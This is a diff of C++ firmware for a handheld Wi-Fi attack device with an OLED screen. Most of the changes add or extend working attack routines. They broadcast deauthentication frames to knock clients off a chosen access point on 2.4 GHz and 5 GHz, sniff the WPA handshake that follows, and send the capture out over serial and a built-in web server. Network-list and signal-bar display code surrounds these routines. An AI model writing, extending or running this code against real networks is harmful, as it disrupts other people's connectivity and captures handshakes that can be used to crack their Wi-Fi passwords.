@@ -72,12 +72,15 @@ float lastBatteryPercentage = 0.0;
 int menuOffset = 0;     // Either 0 or 1 in our case.
 int selectedIndex = 0;  // 0 to 2 (the visible slot index)
 
+bool webserverActive = false;
+int selectedNetworkIndex = 0;
+
 // VARIABLES
 typedef struct {
   String ssid;
   String bssid_str;
   uint8_t bssid[6];
-
+  int security;
   short rssi;
   uint channel;
 } WiFiScanResult;
@@ -154,6 +157,25 @@ const unsigned long DEBOUNCE_DELAY = 150;
 // IMAGES
 static const unsigned char PROGMEM image_wifi_not_connected__copy__bits[] = { 0x21, 0xf0, 0x00, 0x16, 0x0c, 0x00, 0x08, 0x03, 0x00, 0x25, 0xf0, 0x80, 0x42, 0x0c, 0x40, 0x89, 0x02, 0x20, 0x10, 0xa1, 0x00, 0x23, 0x58, 0x80, 0x04, 0x24, 0x00, 0x08, 0x52, 0x00, 0x01, 0xa8, 0x00, 0x02, 0x04, 0x00, 0x00, 0x42, 0x00, 0x00, 0xa1, 0x00, 0x00, 0x40, 0x80, 0x00, 0x00, 0x00 };
 
+// Auxiliary function for the result.security value
+String getSecurityString(unsigned int secVal) {
+  switch(secVal) {
+    case 0:          return "OPEN";
+    case 1:          return "WEP_PSK";
+    case 32769:      return "WEP_SHARED";
+    case 2097154:    return "WPA_TKIP_PSK";
+    case 2097156:    return "WPA_AES_PSK";
+    case 4194306:    return "WPA2_TKIP_PSK";
+    case 4194308:    return "WPA2_AES_PSK";
+    case 4194310:    return "WPA2_MIXED_PSK";
+    case 6291456:    return "WPA_WPA2_MIXED";
+    case 268435456:  return "WPS_OPEN";
+    case 268435460:  return "WPS_SECURE";
+    default:         return "UNKNOWN";
+  }
+}
+
+
 rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   rtw_scan_result_t *record;
   if (scan_result->scan_complete == 0) {
@@ -163,6 +185,7 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
     result.ssid = String((const char *)record->SSID.val);
     result.channel = record->channel;
     result.rssi = record->signal_strength;
+    result.security  = record->security; // TODO: display this somewhere (bigger display version?)
     memcpy(&result.bssid, &record->BSSID, 6);
     char bssid_str[] = "XX:XX:XX:XX:XX:XX";
     snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
@@ -171,6 +194,7 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   }
   return RTW_SUCCESS;
 }
+
 void selectedmenu(String text) {
   display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
   display.println(text);
@@ -178,7 +202,6 @@ void selectedmenu(String text) {
 }
 
 int scanNetworks() {
-  Serial.println(F("Scanning WiFi Network"));
   DEBUG_SER_PRINT("Scanning WiFi Networks (5s)...");
   scan_results.clear();
   if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
@@ -190,7 +213,6 @@ int scanNetworks() {
     return 1;
   }
 }
-
 
 void Single() {
   display.clearDisplay();
@@ -214,6 +236,7 @@ void Single() {
     wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
   }
 }
+
 void All() {
   display.clearDisplay();
   display.setTextColor(SSD1306_WHITE);
@@ -240,6 +263,7 @@ void All() {
     }
   }
 }
+
 void BecaonDeauth() {
   display.clearDisplay();
   display.setTextColor(SSD1306_WHITE);
@@ -265,6 +289,7 @@ void BecaonDeauth() {
     }
   }
 }
+
 void Becaon() {
   display.clearDisplay();
   display.setTextColor(SSD1306_WHITE);
@@ -288,6 +313,7 @@ void Becaon() {
     }
   }
 }
+
 // Custom UI elements
 void drawFrame() {
   display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
@@ -375,36 +401,135 @@ void drawScanScreen() {
   }
 }
 
-void drawNetworkList(const String &selectedSSID, const String &channelType, int scrollIndex) {
+// Map RSSI (in dBm) to a number of bars (1 to 4).
+int getSignalBars(short rssi) {
+  if (rssi >= -60)
+    return 4;
+  else if (rssi >= -70)
+    return 3;
+  else if (rssi >= -80)
+    return 2;
+  else
+    return 1;
+}
+
+
+// draw a simple WiFi signal icon with 4 vertical bars
+// x,y specifies the top-left corner where the icon is drawn
+void drawSignalBars(int x, int y, int bars, uint16_t color) {
+  const int barWidth = 2;
+  const int gap = 1;
+  // Heights for the 4 bars (from left to right)
+  const int heights[4] = {3, 5, 7, 9};
+  
+  // Only draw up to 'bars' filled rectangles
+  for (int i = 0; i < bars && i < 4; i++) {
+    int barX = x + i * (barWidth + gap);
+    int barY = y + (10 - heights[i]);  // Align bars at the bottom of a 10-pixel tall area
+    display.fillRect(barX, barY, barWidth, heights[i], color);
+  }
+}
+
+
+// New function to draw the network list screen with 5 visible networks
+void drawNetworkList() {
   display.clearDisplay();
-  drawFrame();
-  drawStatusBar("NETWORKS");
-
-  // Network info box
-  display.drawRect(4, 20, SCREEN_WIDTH - 8, 30, WHITE);
-  display.setCursor(8, 24);
-  display.print("SSID: ");
-
-  // Truncate SSID if too long
-  String displaySSID = selectedSSID;
-  if (displaySSID.length() > 13) {
-    displaySSID = displaySSID.substring(0, 10) + "...";
+  
+  // Build a vector of valid network indices (only networks with a non-empty SSID)
+  std::vector<int> validIndices;
+  for (size_t i = 0; i < scan_results.size(); i++) {
+    if (scan_results[i].ssid.length() > 0) {
+      validIndices.push_back(i);
+    }
   }
-  display.print(displaySSID);
+  
+  // ---- Header: "NETWORKS (count)" on left, battery % on right ----
+  display.setTextSize(1);
+  String networks = "NETWORKS (";
+  networks += String(validIndices.size()) + ")";
 
-  // Channel type indicator
-  display.drawRect(8, 35, 30, 12, WHITE);
-  display.setCursor(10, 37);
-  display.print(channelType);
-
-  // Scroll indicators
-  if (scrollIndex > 0) {
-    display.fillTriangle(SCREEN_WIDTH - 12, 25, SCREEN_WIDTH - 8, 20, SCREEN_WIDTH - 4, 25, WHITE);
+  drawStatusBar(networks.c_str());
+  
+  display.setCursor(SCREEN_WIDTH - 40, 1);
+  display.print(lastBatteryPercentage, 0);
+  display.print("%");
+  
+  // If no valid networks, display a message and return
+  if (validIndices.size() == 0) {
+    display.setCursor(4, 20);
+    display.print("No networks");
+    display.display();
+    return;
   }
-  if (true) {  // Replace with actual condition for more items below
-    display.fillTriangle(SCREEN_WIDTH - 12, 45, SCREEN_WIDTH - 8, 50, SCREEN_WIDTH - 4, 45, WHITE);
+  
+  // ---- Calculate which networks to show ----
+  // 'scrollindex' now refers to the index within validIndices (0 to validIndices.size()-1)
+  int selectedIndex = scrollindex;
+  int firstVisible = selectedIndex - 2;
+  if (firstVisible < 0) {
+    firstVisible = 0;
   }
+  if (firstVisible > (int)validIndices.size() - 5) {
+    firstVisible = validIndices.size() - 5;
+    if (firstVisible < 0) firstVisible = 0;
+  }
+  
+  // ---- Draw 5 rows using a smaller vertical spacing ----
+  int startY = 16;     // starting Y position for the first network row
+  int lineHeight = 10; // smaller line height for a small screen
+  
+  for (int i = 0; i < 5; i++) {
+    int idx = firstVisible + i;
+    if (idx < validIndices.size()) {
+      int netIdx = validIndices[idx];
+      // Get network name and truncate if too long.
+      String networkName = scan_results[netIdx].ssid;
+      if (networkName.length() > 10) {
+        networkName = networkName.substring(0, 10) + "..";
+      }
+      // determine channel type string
+      String channelStr = (scan_results[netIdx].channel >= 36) ? "5G" : "2.4G";
+      
+      int y = startY + i * lineHeight;
+      
+      // ff this row is the selected one, draw a white rectangle behind it
+      bool isSelected = (idx == selectedIndex);
+      if (isSelected) {
+        display.fillRect(0, y, SCREEN_WIDTH, lineHeight, WHITE);
+        display.setTextColor(BLACK, WHITE);
+      } else {
+        display.setTextColor(SSD1306_WHITE, BLACK);
+      }
+      
+      // Draw network name on the left
+      display.setCursor(2, y);
+      display.print(networkName);
+      
+      // Draw channel info on the right
+      display.setCursor(SCREEN_WIDTH - 50, y);
+      display.print(channelStr);
 
+      // Determine colors for the signal bars.
+      uint16_t barColor = isSelected ? BLACK : SSD1306_WHITE;
+      
+      // Compute number of bars based on the network's RSSI.
+      int bars = getSignalBars(scan_results[netIdx].rssi);
+      // Draw the signal bars icon a few pixels to the right of the channel text.
+      int iconX = SCREEN_WIDTH - 20;  // adjust as needed
+      drawSignalBars(iconX, y, bars, barColor);
+      
+      // If on the top row and there are networks above, show an up arrow
+      if (i == 0 && firstVisible > 0) {
+        display.fillTriangle(SCREEN_WIDTH - 6, 24, SCREEN_WIDTH - 4, 19, SCREEN_WIDTH - 2, 24, WHITE);
+      }
+      
+      // If on the bottom row and there are more networks below, show a down arrow
+      if (i == 2 && (firstVisible + 3) < validIndices.size()) {
+        display.fillTriangle(SCREEN_WIDTH - 6, 55, SCREEN_WIDTH - 4, 60, SCREEN_WIDTH - 2, 55, WHITE);
+      }
+    }
+  }
+  
   display.display();
 }
 
@@ -522,47 +647,54 @@ void attackLoop() {
 // New function to handle network selection
 void networkSelectionLoop() {
   bool running = true;
-  // Add this: Wait for button release before starting loop
   while (digitalRead(BTN_OK) == LOW) {
     delay(10);
   }
-
+  
+  std::vector<int> validIndices;
+  for (size_t i = 0; i < scan_results.size(); i++) {
+    if (scan_results[i].ssid.length() > 0) {
+      validIndices.push_back(i);
+    }
+  }
+  
+  // The loop that lets the user scroll through validIndices remains unchanged...
   while (running) {
-    display.clearDisplay();
-    drawNetworkList(SelectedSSID, SSIDCh, scrollindex);
-
-    // Modified button handling
+    drawNetworkList();
+    
     if (digitalRead(BTN_OK) == LOW) {
       delay(150);
-      // Wait for button release before exiting
       while (digitalRead(BTN_OK) == LOW) {
         delay(10);
       }
       running = false;
     }
-
+    
+    // Handle UP/DOWN buttons as before (updating scrollindex)
     if (digitalRead(BTN_UP) == LOW) {
       delay(150);
-      if (static_cast<size_t>(scrollindex) < scan_results.size() - 1) {  // Added -1 to prevent overflow
+      int validCount = validIndices.size();
+      if (scrollindex < validCount - 1) {
         scrollindex++;
-        SelectedSSID = scan_results[scrollindex].ssid;
-        SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";
       }
     }
-
     if (digitalRead(BTN_DOWN) == LOW) {
       delay(150);
       if (scrollindex > 0) {
         scrollindex--;
-        SelectedSSID = scan_results[scrollindex].ssid;
-        SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";
       }
     }
-
-    display.display();
-    delay(50);  // Add small delay to prevent display flickering
+    delay(50);
+  }
+  
+  // After user selects a network, store the actual index:
+  if (scrollindex < validIndices.size()) {
+    selectedNetworkIndex = validIndices[scrollindex];
+    SelectedSSID = scan_results[selectedNetworkIndex].ssid;
+    SSIDCh = (scan_results[selectedNetworkIndex].channel >= 36) ? "5G" : "2.4G";
   }
 }
+
 
 void setup() {
   pinMode(BTN_DOWN, INPUT_PULLUP);
@@ -978,6 +1110,135 @@ void sendPcapToSerial() {
   Serial.println("-----END PCAP BASE64-----");
 }
 
+// TODO: make it attack on both 2.4ghz and 5ghz at "the same time"
+void deauthAndSniffForNetwork(int netIndex) {
+  Serial.print("Starting attack on ");
+  Serial.print(scan_results[netIndex].ssid);
+  Serial.print(" (channel ");
+  Serial.print(scan_results[netIndex].channel);
+  Serial.println(")");
+
+  // Reset capture buffers.
+  resetCaptureData();
+
+  // Use a local copy of the BSSID.
+  uint8_t local_bssid[6];
+  memcpy(local_bssid, scan_results[netIndex].bssid, 6);
+
+  // Set channel to the target AP's channel.
+  wext_set_channel(WLAN0_NAME, scan_results[netIndex].channel);
+  Serial.print("Switched to channel: ");
+  Serial.println(scan_results[netIndex].channel);
+
+  // Overall timeout for the cycle.
+  unsigned long overallStart = millis();
+  const unsigned long overallTimeout = 60000; // 60 seconds overall timeout
+
+  // Phase durations.
+  const unsigned long deauthInterval = 6000; // deauth phase
+  const unsigned long sniffInterval = 5000;  // sniff phase
+
+  // Outer loop: alternate deauth and sniff until handshake is complete or timeout.
+  while ((capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES ||
+          capturedManagement.frameCount == 0) &&
+         (millis() - overallStart < overallTimeout)) {
+
+    // ----- Deauth Phase -----
+    Serial.println("Deauth phase...");
+    unsigned long deauthPhaseStart = millis();
+    while (millis() - deauthPhaseStart < deauthInterval) {
+      // Send deauth frames.
+      deauth_reason = 1;
+      wifi_tx_deauth_frame(local_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
+      deauth_reason = 4;
+      wifi_tx_deauth_frame(local_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
+      deauth_reason = 16;
+      wifi_tx_deauth_frame(local_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
+      delay(100);
+    }
+
+    // ----- Sniff Phase -----
+    Serial.println("Sniff phase...");
+    enableSniffing();
+    unsigned long sniffPhaseStart = millis();
+    while (millis() - sniffPhaseStart < sniffInterval) {
+      delay(100);
+      // If handshake is complete, exit early.
+      if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
+          capturedManagement.frameCount > 0) {
+        break;
+      }
+    }
+    disableSniffing();
+
+    // Check if handshake capture is complete.
+    if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
+        capturedManagement.frameCount > 0) {
+      break;
+    }
+  }
+
+  Serial.print("Attack on channel ");
+  Serial.print(scan_results[netIndex].channel);
+  Serial.print(" complete; handshake count: ");
+  Serial.println(capturedHandshake.frameCount);
+
+  // Optionally, send the captured PCAP over Serial.
+  if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
+      capturedManagement.frameCount > 0) {
+    printHandshakeData();
+    sendPcapToSerial();
+  } else {
+    Serial.println("Sniff timeout or incomplete handshake.");
+  }
+}
+
+
+void dualAttackAndSniff(String targetSSID) {
+  Serial.println("Checking for dual‑band availability for " + targetSSID);
+  std::vector<int> candidates24;
+  std::vector<int> candidates5;
+
+  for (size_t i = 0; i < scan_results.size(); i++) {
+    if (scan_results[i].ssid == targetSSID) {
+      // For simplicity, assume channel < 36 is 2.4GHz.
+      if (scan_results[i].channel < 36) {
+        candidates24.push_back(i);
+      } else {
+        candidates5.push_back(i);
+      }
+    }
+  }
+
+  // If both bands are available:
+  if (!candidates24.empty() && !candidates5.empty()) {
+    Serial.println("Dual‑band detected. Running attack on both 2.4GHz and 5GHz.");
+
+    // Attack on 2.4 GHz.
+    Serial.println("Starting attack on 2.4GHz network...");
+    deauthAndSniffForNetwork(candidates24[0]);
+    // It’s important to reset capture data between attacks.
+    resetCaptureData();
+    delay(500);
+
+    // Attack on 5 GHz.
+    Serial.println("Starting attack on 5GHz network...");
+    deauthAndSniffForNetwork(candidates5[0]);
+  } else {
+    Serial.println("Dual‑band not fully available. Running single frequency attack.");
+    int index;
+    if (!candidates24.empty()) {
+      index = candidates24[0];
+    } else if (!candidates5.empty()) {
+      index = candidates5[0];
+    } else {
+      Serial.println("Error: No candidate networks found for target SSID.");
+      return;
+    }
+    deauthAndSniffForNetwork(index);
+  }
+}
+
 
 
 void deauthAndSniff() {
@@ -985,41 +1246,40 @@ void deauthAndSniff() {
   resetCaptureData();
 
   // Set the channel to the target AP's channel.
-  wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
+  wext_set_channel(WLAN0_NAME, scan_results[selectedNetworkIndex].channel);
   Serial.print("Switched to channel: ");
-  Serial.println(scan_results[scrollindex].channel);
+  Serial.println(scan_results[selectedNetworkIndex].channel);
 
   // Overall timeout for the entire cycle.
   unsigned long overallStart = millis();
   const unsigned long overallTimeout = 60000; // 60 seconds overall timeout
 
   // Phase durations.
-  const unsigned long deauthInterval = 6000; // deauth phase
-  const unsigned long sniffInterval = 3000;  // sniff phase
+  const unsigned long deauthInterval = 5000; // deauth phase (5 sec)
+  const unsigned long sniffInterval = 4000;  // sniff phase (4 sec)
 
   bool cancelled = false;
 
-  // Function to check for a "long press" (i.e. held for >500ms)
+  // Function to check for a "long press" (held >500ms)
   auto checkForCancel = []() -> bool {
     if (digitalRead(BTN_OK) == LOW) {
       unsigned long pressStart = millis();
       while (digitalRead(BTN_OK) == LOW) {
         delay(10);
         if (millis() - pressStart > 500) {
-          return true; // Cancel if held for more than 500ms
+          return true;
         }
       }
     }
     return false;
   };
 
-  // Outer loop: alternate deauth and sniff until handshake is complete,
-  // overall timeout, or user cancels.
+  // Outer loop: alternate deauth and sniff until handshake complete,
+  // timeout, or cancellation.
   while ((capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES ||
           capturedManagement.frameCount == 0) &&
          (millis() - overallStart < overallTimeout)) {
 
-    // Check for cancellation using our helper function.
     if (checkForCancel()) {
       cancelled = true;
       Serial.println("User canceled deauth+sniff cycle.");
@@ -1030,11 +1290,26 @@ void deauthAndSniff() {
     Serial.println("Starting deauth phase...");
     unsigned long deauthPhaseStart = millis();
     while (millis() - deauthPhaseStart < deauthInterval) {
-      // Check for cancellation inside the phase.
       if (checkForCancel()) {
         cancelled = true;
         break;
       }
+      
+      display.clearDisplay();
+      display.setTextSize(1);
+      display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
+      display.setCursor(5, 10);
+      display.print("Deauthing ");
+      display.print(SelectedSSID);
+      display.setCursor(5, 30);
+      display.print("EAPOL: ");
+      display.print(capturedHandshake.frameCount);
+      display.print("/4");
+      display.setCursor(5, 45);
+      display.print("Progress: ");
+      display.print(spinnerChars[spinnerIndex % 4]);
+      display.display();
+
       memcpy(deauth_bssid, scan_results[scrollindex].bssid, 6);
       wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
       deauth_reason = 1;
@@ -1043,8 +1318,7 @@ void deauthAndSniff() {
       wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
       deauth_reason = 16;
       wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
-    
-      delay(100);
+      delay(50);
     }
     if (cancelled) break;
 
@@ -1057,7 +1331,7 @@ void deauthAndSniff() {
         cancelled = true;
         break;
       }
-      // Update OLED display with progress and spinner.
+      // Update OLED with progress and spinner.
       display.clearDisplay();
       display.setTextSize(1);
       display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
@@ -1075,7 +1349,7 @@ void deauthAndSniff() {
 
       spinnerIndex++;
       delay(100);
-      // If handshake is complete, exit early.
+      // Exit early if handshake complete.
       if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
           capturedManagement.frameCount > 0) {
         break;
@@ -1087,48 +1361,62 @@ void deauthAndSniff() {
     Serial.print("Current handshake count: ");
     Serial.println(capturedHandshake.frameCount);
   }
-
-  // Final display update.
+  
+  // ----- Final Display Update -----
   display.clearDisplay();
   display.setTextSize(1);
   display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
-  display.setCursor(5, 10);
+
   if (cancelled) {
-    display.println("Sniffing canceled!");
+    drawStatusBar("SNIFFING CANCELED");
+    display.setCursor(5, 10);
+    display.println("Press OK to return");
   } else if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
              capturedManagement.frameCount > 0) {
-    display.println("Sniffing complete!");
-    printHandshakeData();
-    sendPcapToSerial();
-    
-    WiFi.disconnect();  // Force a disconnect of the current AP
+    drawStatusBar("SNIFFING OK");
+    display.setCursor(5, 19);
+    display.print("Connect to ");
+    display.print(ssid);
+    display.setCursor(5, 34);
+    display.println("Download pcap from");
+    display.setCursor(5, 46);
+    display.print("http://");
+    display.print(WiFi.localIP());
+    display.display();
 
+    WiFi.disconnect();  // Force a disconnect of the current AP
     delay(500); 
     WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
-    delay(1000);                    // Wait for AP mode to come up
-    Serial.print("New AP IP: ");
-    Serial.println(WiFi.localIP());
+    delay(1000);  // Wait for AP mode to come up
 
-    startWebServer(); // Start webserver to serve captued .pcap file
+    printHandshakeData();
+    sendPcapToSerial();
+    startWebServer();
   } else {
-    display.println("Sniff timeout!");
+    display.clearDisplay();
+    drawStatusBar("SNIFFING TIMEOUT");
+    display.setCursor(5, 10);
+    display.println("Press OK to return");
   }
-  display.setCursor(5, 30);
-  display.print("EAPOL captured: ");
-  display.print(capturedHandshake.frameCount);
-  display.print("/4");
-  display.setCursor(5, 45);
-  display.println("Download the .pcap: WiFi.localIP()");
-  display.display();
 
-  // Wait for user to press OK to return.
+  // Non-blocking wait loop that keeps refreshing the display and checking BTN_OK:
+  unsigned long waitStart = millis();
   while (digitalRead(BTN_OK) != LOW) {
+    // Every second, refresh a prompt (so the display doesn’t appear frozen).
+    if (millis() - waitStart > 1000) {
+      waitStart = millis();
+      display.setCursor(5, 5);
+      //display.print("Press OK to return");
+      display.display();
+    }
     delay(10);
+    yield(); // Let background tasks (e.g. webserver) run.
   }
-  delay(150); // Debounce
+  delay(150); // Debounce delay.
 
   Serial.println("Finished deauth+sniff cycle.");
 }
+
 
 // Function to get the battery voltage (in volts)
 float getBatteryVoltage() {
@@ -1185,6 +1473,23 @@ void loop() {
         startSniffing();
       } else if (actualIndex == 4) { 
           deauthAndSniff();
+          /*
+            // Check if the selected network (SelectedSSID) is available on both bands
+            bool found24 = false, found5 = false;
+            for (size_t i = 0; i < scan_results.size(); i++) {
+              if (scan_results[i].ssid == SelectedSSID) {
+                if (scan_results[i].channel < 36)
+                  found24 = true;
+                else
+                  found5 = true;
+              }
+            }
+            if (found24 && found5) {
+              dualAttackAndSniff(SelectedSSID);
+            } else {
+              // Fall back to the original single frequency attack
+              deauthAndSniff();
+            }*/
       }
       lastOkTime = currentTime;
     }
